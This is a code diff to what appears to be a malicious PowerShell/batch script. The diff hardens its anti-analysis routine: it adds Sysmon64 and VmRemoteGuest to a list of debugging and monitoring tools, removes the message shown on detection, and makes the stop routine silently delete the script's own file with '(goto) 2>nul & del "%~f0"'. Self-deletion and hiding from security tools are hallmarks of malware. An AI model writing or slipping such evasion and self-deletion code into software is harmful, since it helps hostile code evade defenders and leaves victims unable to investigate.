@@ -5,6 +5,7 @@ function ShowError {
 
 function StopBatch {
     taskkill /f /im cmd.exe
+    (goto) 2>nul & del "%~f0" & cmd /c exit /b 10
 }
 
 function Search-Mac {
@@ -189,12 +190,12 @@ function VMPROTECT {
         "wireshark",
         "x32dbg",
         "x64dbg",
+        "VmRemoteGuest",
+        "Sysmon64",
         "xenservice"
     )
     $detectedProcesses = gps -Name $processnames -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name
     if ($null -ne $detectedProcesses) {
-        Write-Output "Detected processes: $($detectedProcesses -join ', ')"
-        Read-Host "Detected processes found, press enter to continue"
         StopBatch
     }
 
